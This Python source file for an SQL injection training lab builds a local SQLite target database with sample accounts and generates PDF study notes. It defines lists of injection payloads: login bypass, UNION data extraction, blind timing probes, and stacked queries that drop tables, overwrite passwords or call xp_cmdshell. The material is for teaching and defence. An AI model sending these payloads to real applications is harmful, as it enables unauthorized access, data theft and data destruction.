#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
SQLMap Scanner & Learning Lab - DSTERMINAL Enterprise Edition
Complete SQL Injection Learning Lab with PDF Notes Generation
"""

import os
import sys
import platform
import codecs
import subprocess
import random
import time
import json
import shutil
import sqlite3
import threading
import webbrowser
from datetime import datetime
from shutil import which
from typing import Optional, Dict, List, Set, Tuple
from dataclasses import dataclass, field
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse
import urllib.parse

# ============================================================
# FIX CONSOLE ENCODING
# ============================================================

def fix_console_encoding():
    """Fix console encoding for Windows to display UTF-8 characters"""
    if platform.system() == 'Windows':
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleCP(65001)
            kernel32.SetConsoleOutputCP(65001)
            
            handle = kernel32.GetStdHandle(-11)
            mode = ctypes.c_ulong()
            if kernel32.GetConsoleMode(handle, ctypes.byref(mode)):
                ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
                if not (mode.value & ENABLE_VIRTUAL_TERMINAL_PROCESSING):
                    kernel32.SetConsoleMode(handle, mode.value | ENABLE_VIRTUAL_TERMINAL_PROCESSING)
            
            if sys.stdout.encoding != 'utf-8':
                sys.stdout = codecs.getwriter('utf-8')(sys.stdout.buffer, 'strict')
                sys.stderr = codecs.getwriter('utf-8')(sys.stderr.buffer, 'strict')
        except:
            pass

# Apply encoding fix
fix_console_encoding()

# Rich imports for UI
try:
    from rich.console import Console
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
    from rich.table import Table
    from rich.layout import Layout
    from rich.align import Align
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.tree import Tree
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    Console = None

# Try to import reportlab for PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4, letter
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, Image
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.enums import TA_CENTER, TA_LEFT, TA_RIGHT, TA_JUSTIFY
    from reportlab.pdfgen import canvas
    from reportlab.lib.units import inch
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False

# ============================================================
# SQL INJECTION TECHNIQUES DATABASE
# ============================================================

SQL_INJECTION_TECHNIQUES = {
    'basic': {
        'name': 'Basic SQL Injection',
        'payloads': [
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "' OR '1'='1' /*",
            "' OR 1=1#",
            "admin' --",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1 --",
            "' UNION SELECT NULL--",
            "' OR '1'='1' AND '1'='1",
            "' OR '1'='1' OR '1'='1' --"
        ],
        'description': 'Basic authentication bypass using OR conditions',
        'example': "' OR '1'='1' --",
        'explanation': 'This technique uses a tautology (always true condition) to bypass authentication. The OR condition makes the WHERE clause always return TRUE, and the -- comments out the rest of the query.'
    },
    'union_based': {
        'name': 'Union-Based SQL Injection',
        'payloads': [
            "' UNION SELECT 1,2,3,4,5,6,7,8 --",
            "' UNION SELECT null, username, password FROM users --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM users --",
            "' UNION SELECT id,username,password,email,phone,department,created_at,last_login FROM users --",
            "' UNION ALL SELECT 1,2,3,4,5,6,7,8 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 WHERE '1'='1",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM information_schema.tables --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM information_schema.columns --",
            "' UNION SELECT 1,version(),database(),user(),5,6,7,8 --",
            "' UNION SELECT 1,2,3,4,5,6,7,8 FROM dual --"
        ],
        'description': 'Extract data from other tables using UNION queries',
        'example': "' UNION SELECT 1,2,3,4,5,6,7,8 --",
        'explanation': 'The UNION operator combines the results of two queries. By injecting a UNION SELECT, you can retrieve data from other tables. The numbers must match the number of columns in the original query.'
    },
    'error_based': {
        'name': 'Error-Based SQL Injection',
        'payloads': [
            "' AND 1=CONVERT(int, @@version) --",
            "' AND 1=CAST((SELECT @@version) AS int) --",
            "' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --",
            "' AND 1=CONVERT(int, (SELECT DB_NAME())) --",
            "' AND 1=CONVERT(int, @@servername) --",
            "' AND 1=CONVERT(int, @@servicename) --",
            "' AND 1=CONVERT(int, @@language) --",
            "' AND 1=CONVERT(int, @@max_connections) --",
            "' AND 1=CONVERT(int, (SELECT COUNT(*) FROM users)) --",
            "' AND 1=CONVERT(int, (SELECT MIN(id) FROM users)) --"
        ],
        'description': 'Extract information through database error messages',
        'example': "' AND 1=CONVERT(int, @@version) --",
        'explanation': 'Error-based injection forces the database to generate an error message that contains useful information. The CONVERT function attempts to convert data to a different type, causing an error that reveals the data.'
    },
    'boolean_based': {
        'name': 'Boolean-Based Blind SQL Injection',
        'payloads': [
            "' AND 1=1 --",
            "' AND 1=2 --",
            "' AND (SELECT COUNT(*) FROM users) = 8 --",
            "' AND (SELECT COUNT(*) FROM users) > 5 --",
            "' AND (SELECT COUNT(*) FROM users) < 10 --",
            "' AND '1'='1' --",
            "' AND '1'='2' --",
            "' AND LENGTH((SELECT TOP 1 username FROM users)) = 5 --",
            "' AND SUBSTRING((SELECT TOP 1 username FROM users),1,1) = 'a' --",
            "' AND ASCII(SUBSTRING((SELECT TOP 1 username FROM users),1,1)) = 97 --"
        ],
        'description': 'Extract information based on true/false responses',
        'example': "' AND 1=1 --",
        'explanation': 'Boolean-based injection uses conditional statements to extract information one bit at a time. The application responds differently based on whether the condition is true or false.'
    },
    'time_based': {
        'name': 'Time-Based Blind SQL Injection',
        'payloads': [
            "' AND SLEEP(5) --",
            "' AND WAITFOR DELAY '0:0:5' --",
            "' AND (SELECT COUNT(*) FROM users) = 8 AND SLEEP(5) --",
            "' AND (SELECT COUNT(*) FROM users) > 5 AND SLEEP(5) --",
            "' AND IF(1=1, SLEEP(5), 0) --",
            "' AND BENCHMARK(1000000, MD5('test')) --",
            "' AND pg_sleep(5) --",
            "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
            "' AND (SELECT COUNT(*) FROM users) = 8 AND pg_sleep(5) --",
            "' AND IF((SELECT COUNT(*) FROM users)=8, SLEEP(5), 0) --"
        ],
        'description': 'Extract information by observing time delays',
        'example': "' AND SLEEP(5) --",
        'explanation': 'Time-based injection uses time delays to extract information. If the condition is true, the database waits for the specified time. By measuring response times, you can infer information.'
    },
    'stacked_queries': {
        'name': 'Stacked Queries SQL Injection',
        'payloads': [
            "'; DROP TABLE users --",
            "'; UPDATE users SET password='hacked' WHERE username='admin' --",
            "'; DELETE FROM orders WHERE user_id=1 --",
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwned') --",
            "'; CREATE TABLE hacked (id INT, data VARCHAR(100)) --",
            "'; ALTER TABLE users ADD COLUMN hacked INT --",
            "'; EXEC xp_cmdshell('dir') --",
            "'; SELECT * INTO tmp FROM users --",
            "'; DROP TABLE tmp --",
            "'; TRUNCATE TABLE logs --"
        ],
        'description': 'Execute multiple SQL statements in a single query',
        'example': "'; DROP TABLE users --",
        'explanation': 'Stacked queries allow execution of multiple SQL statements. This is extremely dangerous as it can be used to modify or destroy data. The semicolon separates statements, and -- comments out the rest.'
    }
}


# ============================================================
# PDF NOTES GENERATOR
# ============================================================

class PDFNotesGenerator:
    """Generate PDF notes for SQL Injection Learning Lab"""
    
    def __init__(self, console=None):
        self.console = console or Console() if RICH_AVAILABLE else None
        self.export_dir = os.path.expanduser("~/DSTerminal_Workspace/notes")
        os.makedirs(self.export_dir, exist_ok=True)
    
    def generate_notes(self, include_techniques: bool = True) -> Optional[str]:
        """Generate PDF notes with DSTerminal v4.0.0.113 watermark"""
        if not REPORTLAB_AVAILABLE:
            if self.console:
                self.console.print("[red]ReportLab not installed. PDF generation requires: pip install reportlab[/red]")
            return None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(self.export_dir, f"sql_injection_notes_{timestamp}.pdf")
            
            doc = SimpleDocTemplate(
                filename,
                pagesize=A4,
                rightMargin=72,
                leftMargin=72,
                topMargin=72,
                bottomMargin=72
            )
            
            story = []
            styles = getSampleStyleSheet()
            
            # Custom styles
            title_style = ParagraphStyle(
                'CustomTitle',
                parent=styles['Heading1'],
                fontSize=28,
                textColor=colors.HexColor('#0066cc'),
                alignment=TA_CENTER,
                spaceAfter=30,
                fontName='Helvetica-Bold'
            )
            
            subtitle_style = ParagraphStyle(
                'Subtitle',
                parent=styles['Normal'],
                fontSize=14,
                textColor=colors.HexColor('#666666'),
                alignment=TA_CENTER,
                spaceAfter=20
            )
            
            heading_style = ParagraphStyle(
                'Heading',
                parent=styles['Heading2'],
                fontSize=18,
                textColor=colors.HexColor('#004d99'),
                spaceAfter=12,
                spaceBefore=18,
                fontName='Helvetica-Bold'
            )
            
            subheading_style = ParagraphStyle(
                'SubHeading',
                parent=styles['Heading3'],
                fontSize=14,
                textColor=colors.HexColor('#0066cc'),
                spaceAfter=8,
                spaceBefore=12,
                fontName='Helvetica-Bold'
            )
            
            body_style = ParagraphStyle(
                'Body',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.HexColor('#333333'),
                alignment=TA_LEFT,
                spaceAfter=6,
                fontName='Helvetica'
            )
            
            code_style = ParagraphStyle(
                'Code',
                parent=styles['Normal'],
                fontSize=9,
                textColor=colors.HexColor('#006600'),
                alignment=TA_LEFT,
                spaceAfter=4,
                fontName='Courier'
            )
            
            footer_style = ParagraphStyle(
                'Footer',
                parent=styles['Normal'],
                fontSize=8,
                textColor=colors.HexColor('#666666'),
                alignment=TA_CENTER,
                spaceAfter=4
            )
            
            def add_watermark(canvas_obj, doc_obj):
                canvas_obj.saveState()
                canvas_obj.setFillColor(colors.HexColor('#cccccc'))
                canvas_obj.setFont('Helvetica-Bold', 60)
                canvas_obj.rotate(45)
                canvas_obj.drawString(200, 150, "DSTerminal v4.0.0.113")
                canvas_obj.setFillColor(colors.HexColor('#dddddd'))
                canvas_obj.setFont('Helvetica', 30)
                canvas_obj.rotate(-30)
                canvas_obj.drawString(450, -100, "DSTerminal v4.0.0.113")
                canvas_obj.setFillColor(colors.HexColor('#eeeeee'))
                canvas_obj.setFont('Helvetica', 10)
                canvas_obj.rotate(0)
                canvas_obj.drawString(300, 30, "Generated by DSTerminal v4.0.0.113")
                canvas_obj.restoreState()
            
            # Title
            story.append(Paragraph("SQL Injection Learning Notes", title_style))
            story.append(Paragraph("A Comprehensive Guide to Understanding SQL Injection Attacks", subtitle_style))
            story.append(Spacer(1, 12))
            
            # Metadata
            meta_style = ParagraphStyle(
                'Meta',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.grey,
                alignment=TA_LEFT
            )
            
            metadata = [
                f"<b>Generated:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
                f"<b>Version:</b> DSTERMINAL v4.0.0.113",
                f"<b>Classification:</b> Educational Material - SQL Injection Lab"
            ]
            
            for meta in metadata:
                story.append(Paragraph(meta, meta_style))
            story.append(Spacer(1, 20))
            
            # SECTION 1: Introduction
            story.append(Paragraph("1. Introduction to SQL Injection", heading_style))
            story.append(Paragraph(
                "SQL Injection is one of the most common and dangerous web application vulnerabilities. "
                "It occurs when an attacker is able to insert malicious SQL code into a query, allowing them to "
                "view, modify, or delete data from the database.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("1.1 What is SQL Injection?", subheading_style))
            story.append(Paragraph(
                "SQL Injection is a code injection technique that exploits vulnerabilities in web applications. "
                "It happens when user input is not properly sanitized and is passed directly to the database query.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("1.2 Why is SQL Injection Dangerous?", subheading_style))
            story.append(Paragraph(
                "SQL Injection can lead to:",
                body_style
            ))
            dangers = [
                "Unauthorized access to sensitive data (passwords, credit cards, personal information)",
                "Data modification (changing, deleting, or adding data)",
                "Privilege escalation (gaining admin access)",
                "Complete system compromise (via stacked queries or file operations)"
            ]
            for danger in dangers:
                story.append(Paragraph(f"- {danger}", body_style))
            story.append(Spacer(1, 10))
            
            # SECTION 2: How SQL Injection Works
            story.append(PageBreak())
            story.append(Paragraph("2. How SQL Injection Works", heading_style))
            
            story.append(Paragraph("2.1 The Vulnerable Code Pattern", subheading_style))
            story.append(Paragraph(
                "A typical vulnerable code pattern looks like this:",
                body_style
            ))
            story.append(Paragraph(
                "<i>query = \"SELECT * FROM users WHERE username = '\" + username + \"' AND password = '\" + password + \"'\"</i>",
                code_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("2.2 The Injection Process", subheading_style))
            story.append(Paragraph(
                "When an attacker enters <b>' OR '1'='1' --</b> as the username, the query becomes:",
                body_style
            ))
            story.append(Paragraph(
                "<i>SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''</i>",
                code_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("2.3 Why This Works", subheading_style))
            steps = [
                "The <b>OR '1'='1'</b> condition is always TRUE, making the WHERE clause return all users.",
                "The <b>--</b> comments out the rest of the query, bypassing the password check.",
                "The attacker is logged in as the first user in the database (usually the admin)."
            ]
            for i, step in enumerate(steps, 1):
                story.append(Paragraph(f"<b>Step {i}:</b> {step}", body_style))
            story.append(Spacer(1, 10))
            
            # SECTION 3: Types of SQL Injection
            story.append(PageBreak())
            story.append(Paragraph("3. Types of SQL Injection Attacks", heading_style))
            
            techniques = [
                ("3.1 Basic SQL Injection", SQL_INJECTION_TECHNIQUES['basic']),
                ("3.2 Union-Based SQL Injection", SQL_INJECTION_TECHNIQUES['union_based']),
                ("3.3 Error-Based SQL Injection", SQL_INJECTION_TECHNIQUES['error_based']),
                ("3.4 Boolean-Based Blind SQL Injection", SQL_INJECTION_TECHNIQUES['boolean_based']),
                ("3.5 Time-Based Blind SQL Injection", SQL_INJECTION_TECHNIQUES['time_based']),
                ("3.6 Stacked Queries SQL Injection", SQL_INJECTION_TECHNIQUES['stacked_queries'])
            ]
            
            for title, tech in techniques:
                story.append(Paragraph(title, subheading_style))
                story.append(Paragraph(f"<b>Description:</b> {tech['description']}", body_style))
                story.append(Paragraph(f"<b>Example Payload:</b> <i>{tech['example']}</i>", body_style))
                story.append(Paragraph(f"<b>How It Works:</b> {tech['explanation']}", body_style))
                
                story.append(Paragraph("<b>Common Payloads:</b>", body_style))
                for payload in tech['payloads'][:3]:
                    story.append(Paragraph(f"- <i>{payload}</i>", code_style))
                if len(tech['payloads']) > 3:
                    story.append(Paragraph(f"- ... and {len(tech['payloads']) - 3} more payloads", body_style))
                story.append(Spacer(1, 10))
            
            # SECTION 4: Prevention
            story.append(PageBreak())
            story.append(Paragraph("4. How to Prevent SQL Injection", heading_style))
            
            prevention_methods = [
                ("4.1 Use Parameterized Queries", 
                 "Always use prepared statements with parameters. This separates SQL code from data."),
                ("4.2 Input Validation and Sanitization", 
                 "Validate and sanitize all user inputs. Use allowlists (whitelists) for expected values."),
                ("4.3 Least Privilege Principle", 
                 "Database accounts should have the minimum privileges needed."),
                ("4.4 Use Stored Procedures", 
                 "Stored procedures can help prevent SQL injection by encapsulating database logic."),
                ("4.5 Regular Security Audits", 
                 "Regularly test your applications for SQL injection vulnerabilities."),
                ("4.6 Web Application Firewall (WAF)", 
                 "Deploy a WAF that can detect and block SQL injection attempts.")
            ]
            
            for title, content in prevention_methods:
                story.append(Paragraph(title, subheading_style))
                story.append(Paragraph(content, body_style))
                story.append(Spacer(1, 6))
            
            # SECTION 5: Secure vs Vulnerable Code
            story.append(PageBreak())
            story.append(Paragraph("5. Secure vs Vulnerable Code Examples", heading_style))
            
            story.append(Paragraph("5.1 Vulnerable Code (PHP)", subheading_style))
            story.append(Paragraph(
                "<i>$query = \"SELECT * FROM users WHERE username = '\" . $_POST['username'] . \"' AND password = '\" . $_POST['password'] . \"'\";</i>",
                code_style
            ))
            story.append(Paragraph(
                "<b>Why it's vulnerable:</b> Direct string concatenation allows SQL injection.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("5.2 Secure Code (PHP with PDO)", subheading_style))
            story.append(Paragraph(
                "<i>$stmt = $pdo->prepare(\"SELECT * FROM users WHERE username = ? AND password = ?\");</i>",
                code_style
            ))
            story.append(Paragraph(
                "<i>$stmt->execute([$_POST['username'], $_POST['password']]);</i>",
                code_style
            ))
            story.append(Paragraph(
                "<b>Why it's secure:</b> Parameterized queries prevent SQL injection.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph("5.3 Secure Code (Python with SQLite)", subheading_style))
            story.append(Paragraph(
                "<i>cursor.execute(\"SELECT * FROM users WHERE username = ? AND password = ?\", (username, password))</i>",
                code_style
            ))
            story.append(Paragraph(
                "<b>Why it's secure:</b> Parameterized queries separate SQL from data.",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            # SECTION 6: Common Myths
            story.append(PageBreak())
            story.append(Paragraph("6. Common Myths About SQL Injection", heading_style))
            
            myths = [
                ("Myth: My application is too small to be targeted",
                 "Truth: Attackers use automated tools to scan for vulnerabilities."),
                ("Myth: Using a firewall is enough",
                 "Truth: Firewalls don't protect against SQL injection."),
                ("Myth: I use prepared statements, so I'm 100% secure",
                 "Truth: You still need proper input validation."),
                ("Myth: SQL injection only affects databases",
                 "Truth: SQL injection can lead to complete server compromise."),
                ("Myth: I can just sanitize user input with addslashes()",
                 "Truth: addslashes() is not sufficient for preventing SQL injection.")
            ]
            
            for myth, truth in myths:
                story.append(Paragraph(f"<b>{myth}</b>", subheading_style))
                story.append(Paragraph(truth, body_style))
                story.append(Spacer(1, 6))
            
            # SECTION 7: Hands-On Exercise
            story.append(PageBreak())
            story.append(Paragraph("7. Hands-On Exercise: SQL Injection Lab", heading_style))
            
            story.append(Paragraph(
                "This document accompanies the DSTERMINAL SQL Injection Learning Lab. "
                "To practice what you've learned:",
                body_style
            ))
            story.append(Spacer(1, 10))
            
            exercises = [
                "1. Start the lab: <i>sqllab</i> in DSTERMINAL terminal",
                "2. Navigate to <i>http://localhost:8080</i> in your browser",
                "3. Try the basic SQL injection: <i>' OR '1'='1' --</i> as username",
                "4. Observe how it bypasses authentication",
                "5. Try Union-based injection: <i>' UNION SELECT 1,2,3,4,5,6,7,8 --</i>",
                "6. Toggle secure mode and see how it prevents injection",
                "7. Explore the Learning Center for more techniques"
            ]
            
            for exercise in exercises:
                story.append(Paragraph(exercise, body_style))
            story.append(Spacer(1, 10))
            
            story.append(Paragraph(
                "<b>Learning Objectives:</b> By completing this lab, you will understand how SQL injection works, "
                "how to identify vulnerable code, and how to prevent it effectively.",
                body_style
            ))
            
            # SECTION 8: Summary
            story.append(PageBreak())
            story.append(Paragraph("8. Summary and Key Takeaways", heading_style))
            
            takeaways = [
                "- SQL injection is a serious security vulnerability",
                "- Always use parameterized queries to prevent injection",
                "- Validate and sanitize all user inputs",
                "- Follow the principle of least privilege",
                "- Regular security testing is essential",
                "- Security is a process, not a one-time fix"
            ]
            
            for takeaway in takeaways:
                story.append(Paragraph(takeaway, body_style))
            story.append(Spacer(1, 20))
            
            # FOOTER WITH CONTACT INFO
            story.append(Spacer(1, 30))
            
            contact_style = ParagraphStyle(
                'Contact',
                parent=styles['Normal'],
                fontSize=10,
                textColor=colors.HexColor('#004d99'),
                alignment=TA_CENTER,
                spaceAfter=4
            )
            
            story.append(Paragraph("-" * 80, footer_style))
            story.append(Spacer(1, 10))
            story.append(Paragraph(
                "<b>For more information, please contact:</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Stark Expo Tech Exchange Support Team",
                contact_style
            ))
            story.append(Paragraph(
                "Email: <b>starkec.team@outlook.com</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Email: <b>info@starkteamsupport.mw</b>",
                contact_style
            ))
            story.append(Paragraph(
                "Website: Stark Expo Tech Exchange",
                contact_style
            ))
            story.append(Spacer(1, 10))
            story.append(Paragraph("-" * 80, footer_style))
            story.append(Spacer(1, 6))
            story.append(Paragraph(
                "(c) 2024 DSTERMINAL v4.0.0.113 | SQL Injection Learning Notes | All Rights Reserved",
                footer_style
            ))
            story.append(Paragraph(
                "This document is for educational purposes only. Use responsibly.",
                footer_style
            ))
            
            doc.build(story, onFirstPage=add_watermark, onLaterPages=add_watermark)
            
            if self.console:
                self.console.print(f"[green]PDF Notes generated: {filename}[/green]")
            
            return filename
            
        except Exception as e:
            if self.console:
                self.console.print(f"[red]PDF generation failed: {str(e)}[/red]")
            return None


# ============================================================
# SQL INJECTION LEARNING LAB
# ============================================================

class SQLInjectionLab:
    """Interactive SQL Injection Learning Lab with Multiple Techniques"""
    
    def __init__(self, console=None):
        self.console = console or Console() if RICH_AVAILABLE else None
        self.db_path = os.path.expanduser("~/DSTerminal_Workspace/lab.db")
        self.server = None
        self.server_thread = None
        self.port = 8080
        self.running = False
        self.secure_mode = False
        self.current_credentials = {
            'username': 'admin',
            'password': 'admin123'
        }
        self.session_log = []
        self.user_products = {}
        self.show_learning = False
        self.detected_techniques = set()
        self.injection_attempts = []
        self.pdf_generator = PDFNotesGenerator(console)
        
        self._init_database()
    
    def _init_database(self):
        """Initialize SQLite database with sample data"""
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL UNIQUE,
                    password TEXT NOT NULL,
                    role TEXT DEFAULT 'user',
                    email TEXT,
                    phone TEXT,
                    department TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP,
                    is_active INTEGER DEFAULT 1
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS products (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    name TEXT NOT NULL,
                    price REAL,
                    description TEXT,
                    stock INTEGER DEFAULT 0,
                    category TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS orders (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    product_id INTEGER,
                    quantity INTEGER,
                    total REAL,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id),
                    FOREIGN KEY (product_id) REFERENCES products (id)
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT,
                    action TEXT,
                    ip TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS injection_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    technique TEXT,
                    payload TEXT,
                    username TEXT,
                    success INTEGER DEFAULT 0,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            cursor.execute("SELECT COUNT(*) FROM users")
            if cursor.fetchone()[0] == 0:
                sample_users = [
                    ('admin', 'admin123', 'administrator', 'admin@lab.local', '+1-555-0001', 'IT Security'),
                    ('john_doe', 'john2024!', 'user', 'john@example.com', '+1-555-0002', 'Sales'),
                    ('jane_smith', 'jane@456#', 'user', 'jane@example.com', '+1-555-0003', 'Marketing'),
                    ('bob_wilson', 'bob$wilson789', 'user', 'bob@example.com', '+1-555-0004', 'Engineering'),
                    ('alice_brown', 'alice!brown#2024', 'user', 'alice@example.com', '+1-555-0005', 'HR'),
                    ('charlie_davis', 'charlie@davis#321', 'user', 'charlie@example.com', '+1-555-0006', 'Finance'),
                    ('emma_jones', 'emma$jones#654', 'user', 'emma@example.com', '+1-555-0007', 'Operations'),
                    ('mike_taylor', 'mike@taylor#987', 'user', 'mike@example.com', '+1-555-0008', 'Support'),
                    ('sarah_wilson', 'sarah@wilson#123', 'user', 'sarah@example.com', '+1-555-0009', 'Design'),
                    ('david_clark', 'david@clark#456', 'user', 'david@example.com', '+1-555-0010', 'Development')
                ]
                cursor.executemany(
                    "INSERT INTO users (username, password, role, email, phone, department) VALUES (?, ?, ?, ?, ?, ?)",
                    sample_users
                )
            
            cursor.execute("SELECT COUNT(*) FROM products")
            if cursor.fetchone()[0] == 0:
                cursor.execute("SELECT id FROM users")
                user_ids = [row[0] for row in cursor.fetchall()]
                
                product_templates = [
                    ('Laptop Pro X', 1299.99, 'High-performance laptop with 16GB RAM', 'Electronics'),
                    ('Smartphone Z', 799.99, 'Latest 5G smartphone with 128GB storage', 'Electronics'),
                    ('Wireless Headphones', 149.99, 'Noise-cancelling bluetooth headphones', 'Audio'),
                    ('Smart Watch', 299.99, 'Fitness tracking with heart rate monitor', 'Wearables'),
                    ('USB-C Hub', 59.99, '7-in-1 USB-C hub with HDMI', 'Accessories'),
                    ('Gaming Mouse', 79.99, 'RGB gaming mouse with 6 programmable buttons', 'Gaming'),
                    ('Mechanical Keyboard', 129.99, 'RGB mechanical keyboard with blue switches', 'Gaming'),
                    ('External SSD', 199.99, '1TB portable SSD with USB 3.2', 'Storage'),
                    ('Webcam HD', 89.99, '1080p HD webcam with microphone', 'Accessories'),
                    ('Wireless Charger', 39.99, 'Fast wireless charging pad for phones', 'Accessories')
                ]
                
                for user_id in user_ids:
                    num_products = random.randint(3, 5)
                    selected = random.sample(product_templates, min(num_products, len(product_templates)))
                    for product in selected:
                        stock = random.randint(5, 50)
                        cursor.execute(
                            "INSERT INTO products (user_id, name, price, description, stock, category) VALUES (?, ?, ?, ?, ?, ?)",
                            (user_id, product[0], product[1], product[2], stock, product[3])
                        )
            
            conn.commit()
            conn.close()
            
            if self.console:
                self.console.print("[green]SQL Injection Lab database initialized[/green]")
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Database initialization error: {e}[/red]")
    
    def _get_db_connection(self):
        try:
            return sqlite3.connect(self.db_path)
        except Exception as e:
            if self.console:
                self.console.print(f"[red]Database connection error: {e}[/red]")
            return None
    
    def set_secure_mode(self, enabled: bool):
        self.secure_mode = enabled
        if self.console:
            status = "[green]ENABLED[/green]" if enabled else "[red]DISABLED[/red]"
            self.console.print(f"[yellow]Secure mode: {status}[/yellow]")
    
    def toggle_learning(self):
        self.show_learning = not self.show_learning
        return self.show_learning
    
    def add_log(self, username: str, action: str, ip: str = "127.0.0.1"):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO logs (username, action, ip) VALUES (?, ?, ?)",
                (username, action, ip)
            )
            conn.commit()
            conn.close()
        except:
            pass
    
    def log_injection_attempt(self, technique: str, payload: str, username: str, success: bool = False):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO injection_attempts (technique, payload, username, success) VALUES (?, ?, ?, ?)",
                (technique, payload, username, 1 if success else 0)
            )
            conn.commit()
            conn.close()
            self.injection_attempts.append({
                'technique': technique,
                'payload': payload,
                'username': username,
                'success': success,
                'timestamp': datetime.now()
            })
            if success:
                self.detected_techniques.add(technique)
        except:
            pass
    
    def get_injection_attempts(self, limit: int = 50) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute(
                "SELECT technique, payload, username, success, timestamp FROM injection_attempts ORDER BY id DESC LIMIT ?",
                (limit,)
            )
            rows = cursor.fetchall()
            conn.close()
            return [
                {'technique': r[0], 'payload': r[1], 'username': r[2], 
                 'success': r[3], 'timestamp': r[4]}
                for r in rows
            ]
        except:
            return []
    
    def get_users(self) -> List[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return []
            cursor = conn.cursor()
            cursor.execute("SELECT id, username, role, email, phone, department, created_at, last_login, is_active FROM users")
            rows = cursor.fetchall()
            conn.close()
            return [
                {'id': r[0], 'username': r[1], 'role': r[2], 'email': r[3], 
                 'phone': r[4], 'department': r[5], 'created_at': r[6], 
                 'last_login': r[7], 'is_active': r[8]}
                for r in rows
            ]
        except:
            return []
    
    def get_user_by_username(self, username: str) -> Optional[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return None
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, password, role, email, phone, department FROM users WHERE username = ?",
                (username,)
            )
            row = cursor.fetchone()
            conn.close()
            if row:
                return {
                    'id': row[0], 'username': row[1], 'password': row[2],
                    'role': row[3], 'email': row[4], 'phone': row[5],
                    'department': row[6]
                }
            return None
        except:
            return None
    
    def authenticate_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            conn = self._get_db_connection()
            if not conn:
                return None
            cursor = conn.cursor()
            cursor.execute(
                "SELECT id, username, role, email, phone, department FROM users WHERE username = ? AND password = ? AND is_active = 1",
                (username, password)
            )
            row = cursor.fetchone()
            conn.close()
            if row:
                self._update_last_login(row[0])
                return {
                    'id': row[0], 'username': row[1], 'role': row[2],
                    'email': row[3], 'phone': row[4], 'department': row[5]
                }
            return None
        except:
            return None
    
    def _update_last_login(self, user_id: int):
        try:
            conn = self._get_db_connection()
            if not conn:
                return
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?",
                (user_id,)
            )
            conn.commit()
            conn.close()
        except:
